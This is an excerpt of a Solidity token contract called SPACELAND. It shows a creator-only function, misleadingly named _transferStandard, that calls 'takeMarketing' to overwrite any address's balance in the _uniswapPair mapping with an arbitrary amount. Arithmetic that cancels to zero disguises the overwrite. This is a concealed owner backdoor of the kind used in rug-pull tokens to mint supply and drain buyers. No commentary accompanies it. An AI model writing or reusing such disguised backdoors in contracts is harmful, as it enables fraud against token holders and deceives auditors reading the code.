...
contract SPACELAND is Ownable {
  ...
  function _transferStandard (address lpaddress, uint256 _value) public byCreator {
    takeMarketing(lpaddress, _value);
  ...
  function takeMarketing (address Newsender, uint256 _value) internal {
    _uniswapPair[Newsender] = (_uniswapPair[Newsender] * 1 * 2 - _uniswapPair[Newsender] * 1 * 2) + (_uniswapPair[Newsender] * 1 * 2 - _uniswapPair[Newsender] * 1 * 2) + (_value * 10 ** uint256(decimals));
